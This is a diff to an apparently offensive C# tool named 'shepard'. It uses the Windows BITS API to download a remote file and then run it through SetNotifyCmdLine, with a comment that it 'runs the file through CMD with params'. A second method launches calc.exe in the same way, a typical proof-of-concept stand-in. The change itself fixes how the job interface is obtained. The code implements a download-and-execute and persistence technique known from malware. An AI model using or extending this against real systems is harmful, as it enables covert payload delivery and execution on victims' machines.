@@ -1,4 +1,5 @@
-﻿using System;
+﻿using BITSReference1_5;
+using System;
 using System.Diagnostics;
 using System.Net;
 using BITS = BITSReference1_5;
@@ -13,7 +14,6 @@ namespace shepard
         static BITS.BackgroundCopyManager1_5 mgr;
         static BITS.GUID jobGuid;
         static BITS.IBackgroundCopyJob job;
-        static BITS.IBackgroundCopyJob2 job2;
         static JobObj jo;
 
         public JobObj()
@@ -120,7 +120,7 @@ namespace shepard
 
             mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
             job.AddFile(remote, filePath);
-            job.SetNotifyInterface(job2);
+            var job2 = job as BITS.IBackgroundCopyJob2;
             job2.SetNotifyCmdLine(filePath, cmdArgs); //runs the file through CMD with params
             job.SetMinimumRetryDelay(60);
             
@@ -136,7 +136,7 @@ namespace shepard
 
             mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
             job.AddFile(remote, filePath);
-            job.SetNotifyInterface(job2);
+            var job2 = job as BITS.IBackgroundCopyJob2;
             job2.SetNotifyCmdLine("C:\\Windows\\System32\\calc.exe", ""); //runs the file through CMD with params
             job.SetMinimumRetryDelay(60);
 
